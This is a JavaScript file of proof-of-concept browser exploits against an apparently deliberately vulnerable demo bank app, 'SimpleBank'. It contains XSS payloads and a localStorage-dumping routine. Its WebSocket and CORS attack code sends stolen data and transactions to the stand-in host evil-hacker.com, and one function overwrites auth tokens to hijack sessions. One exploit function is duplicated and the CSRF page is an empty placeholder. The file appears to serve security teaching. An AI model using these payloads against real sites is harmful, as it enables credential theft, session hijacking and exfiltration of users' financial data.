// This file contains proof-of-concept exploits for the intentional vulnerabilities
// in the SimpleBank application. Open this in your browser console to run these exploits.

// =================================================================
// 0. UTILITY DEMOS
// =================================================================

/**
 * Simulates an XSS execution by injecting an <img onerror> into the chat display.
 */
function simulateXSSExecution() {
    const payload = `<img src="x" onerror="alert('🔥 XSS Executed!')" />`;
    const target = document.getElementById('chat-display');
    if (target) {
      target.innerHTML += `<div class="chat-message">${payload}</div>`;
    } else {
      console.warn('No #chat-display element found to inject XSS demo.');
    }
  }
  
  // =================================================================
  // 1. LOCALSTORAGE VULNERABILITY EXPLOITS
  // =================================================================
  
  /**
   * Steals all data from localStorage
   * In a real attack, this would happen through XSS or from a malicious website
   */
  function stealLocalStorageData() {
    console.log("%c[EXPLOIT] Stealing data from localStorage...", "color: red; font-weight: bold");
    
    const stolenData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      stolenData[key] = localStorage.getItem(key);
    }
    
    console.log("%cStolen data:", "color: red", stolenData);
    console.log("%cIn a real attack, this data would be sent to a malicious server", "color: red");
    console.log("%cPOST request to evil-hacker.com/steal with data:", "color: red", JSON.stringify(stolenData));
  
    // — LIVE DEMO: append results to page
    const out = document.createElement('pre');
    out.id = 'exploit-output';
    out.style = 'position:fixed;top:10px;right:10px;background:#fff;border:2px solid red;padding:10px;max-height:200px;overflow:auto;z-index:9999;';
    out.textContent = JSON.stringify(stolenData, null, 2);
    document.body.appendChild(out);
  
    return stolenData;
  }

   function stealLocalStorageData() {
    console.log("%c[EXPLOIT] Stealing data from localStorage...", "color: red; font-weight: bold");
    
    const stolenData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      stolenData[key] = localStorage.getItem(key);
    }
    
    console.log("%cStolen data:", "color: red", stolenData);
    console.log("%cIn a real attack, this data would be sent to a malicious server", "color: red");
    console.log("%cPOST request to evil-hacker.com/steal with data:", "color: red", JSON.stringify(stolenData));
  
    // — LIVE DEMO: append results to page
    const out = document.createElement('pre');
    out.id = 'exploit-output';
    out.style = 'position:fixed;top:10px;right:10px;background:#fff;border:2px solid red;padding:10px;max-height:200px;overflow:auto;z-index:9999;';
    out.textContent = JSON.stringify(stolenData, null, 2);
    document.body.appendChild(out);
  
    return stolenData;
  }
  
  /**
   * Session hijacking through localStorage manipulation
   */
  function hijackUserSession() {
    console.log("%c[EXPLOIT] Hijacking user session...", "color: red; font-weight: bold");
    
    const originalToken = localStorage.getItem('simplebank_auth_token');
    console.log("%cOriginal auth token:", "color: red", originalToken);
    
    // Create a malicious token
    const hackerToken = "hacker_" + Date.now();
    localStorage.setItem('simplebank_auth_token', hackerToken);
    localStorage.setItem('simplebank_username', 'HACKER');
    localStorage.setItem('simplebank_account', '1337-HACKED');
    
    console.log("%cSession hijacked! New token:", "color: red", hackerToken);
    console.log("%cRefresh the page to see the effects", "color: red");
  
    // — LIVE DEMO: reload so UI picks up new values
    location.reload();
  
    return { originalToken, hackerToken };
  }
  
  /**
   * XSS payload that could be used to steal localStorage data
   * (if the application had an XSS vulnerability)
   */
  function generateXSSPayload() {
    const xssPayload = `
  <script>
    // Create hidden image to exfiltrate data
    const img = new Image();
    const stolenData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      stolenData[key] = localStorage.getItem(key);
    }
    img.src = 'https://evil-hacker.com/steal?data=' + encodeURIComponent(JSON.stringify(stolenData));
    document.body.appendChild(img);
  </script>
    `;
    
    console.log("%c[EXPLOIT] XSS Payload:", "color: red; font-weight: bold");
    console.log("%c" + xssPayload, "color: red");
    return xssPayload;
  }
  
  // =================================================================
  // 2. WEBSOCKET VULNERABILITY EXPLOITS
  // =================================================================
  
  /**
   * Demonstrates exploiting insecure WebSockets from another origin
   */
  function exploitWebSocketFromMaliciousSite() {
    console.log("%c[EXPLOIT] Connecting to WebSocket from unauthorized origin...", "color: red; font-weight: bold");
    console.log("%cAttacker code running on evil-hacker.com:", "color: red");
    console.log("%cAttempting to connect to ws://simplebank.com/chat", "color: red");
    
    const maliciousCode = `
    // On evil-hacker.com
    const socket = new WebSocket('ws://simplebank.com/chat');
    socket.onopen = function() {
      socket.send(JSON.stringify({ type:'message', text:'<img src=x onerror="alert(document.cookie)">' }));
    };
    socket.onmessage = function(ev) {
      const data = JSON.parse(ev.data);
      fetch('https://evil-hacker.com/stolen-ws-data', { method:'POST', body:JSON.stringify(data) });
    };
    `;
    console.log("%c" + maliciousCode, "color: red");
    return maliciousCode;
  }
  
  /**
   * Demonstrates WebSocket message injection attack
   */
  function injectMaliciousWebSocketMessage() {
    console.log("%c[EXPLOIT] Injecting malicious WebSocket message...", "color: red; font-weight: bold");
    const maliciousMessage = `<img src="x" onerror="alert('XSS via WebSocket message!')">`;
    
    // Insert into chat input
    const input = document.getElementById('message-input');
    if (input) {
      input.value = maliciousMessage;
      console.log("%cInjected XSS payload into message input:", "color: red", maliciousMessage);
      const sendBtn = document.getElementById('send-button');
      if (sendBtn) {
        sendBtn.click();
        console.log("%cAuto-clicked Send to deliver payload.", "color: red");
      }
    } else {
      console.log("%cMalicious WebSocket message payload:", "color: red", maliciousMessage);
    }
    return maliciousMessage;
  }
  
  // =================================================================
  // 3. CORS VULNERABILITY EXPLOITS
  // =================================================================
  
  /**
   * Demonstrates a CORS exploit from a malicious origin
   */
  function corsExploit() {
    console.log("%c[EXPLOIT] Exploiting misconfigured CORS policy...", "color: red; font-weight: bold");
    
    fetch('https://api.simplebank.com/transactions', {
      method: 'GET',
      credentials: 'include'
    })
    .then(res => res.json())
    .then(data => {
      console.log('Successfully exploited CORS! User data:', data);
      alert('CORS-stolen data:\n' + JSON.stringify(data, null,2));
      // simulate exfil
      fetch('https://evil-hacker.com/stolen-data', { method:'POST', body:JSON.stringify(data) });
    })
    .catch(err => console.error('CORS exploit failed:', err));
  }
  
  /**
   * Demonstrates a CSRF attack leveraging CORS misconfiguration
   */
  function csrfAttack() {
    console.log("%c[EXPLOIT] Demonstrating CSRF attack with animated prize wheel...", "color: red; font-weight: bold");
  
    const maliciousHtml = `
  <!DOCTYPE html>
  <html>
  <head>…</head>
  <body>…</body>
  </html>
    `;
    // (your full spinning-wheel snippet here)
    
    const popup = window.open("", "_blank", "width=600,height=600");
    popup.document.write(maliciousHtml);
    popup.document.close();
    console.log("%cPrize wheel CSRF page loaded in new tab.", "color: red");
  }
  
  // =================================================================
  // RUN ALL DEMOS
  // =================================================================
  
  function runAllExploits() {
    console.log("%c=== HTML5 VULNERABILITY DEMONSTRATION ===", "color: red; font-size: 16px; font-weight: bold");
    
    console.log("%c\n--- LocalStorage Exploits ---", "color: red; font-size: 14px");
    stealLocalStorageData();
    // hijackUserSession();   // uncomment to actually reload/session-hijack
    generateXSSPayload();
    
    console.log("%c\n--- WebSocket Exploits ---", "color: red; font-size: 14px");
    exploitWebSocketFromMaliciousSite();
    injectMaliciousWebSocketMessage();
    
    console.log("%c\n--- CORS Exploits ---", "color: red; font-size: 14px");
    corsExploit();
    csrfAttack();
    
    console.log("%c\n=== End of Demonstration ===", "color: red; font-size: 16px");
  }
  
  // Print usage instructions
  console.log(`
  HTML5 VULNERABILITY EXPLOITS DEMONSTRATION
  -----------------------------------------
  1. stealLocalStorageData()  →  appends stolen JSON to page
  2. hijackUserSession()      →  overwrites localStorage + reloads
  3. generateXSSPayload()    →  logs payload to console
  4. exploitWebSocketFromMaliciousSite()  →  logs code
  5. injectMaliciousWebSocketMessage()    →  injects + auto-clicks send
  6. corsExploit()            →  fetches & alerts real data
  7. csrfAttack()             →  opens animated wheel CSRF demo
  
  Or just run: runAllExploits()
  `);
  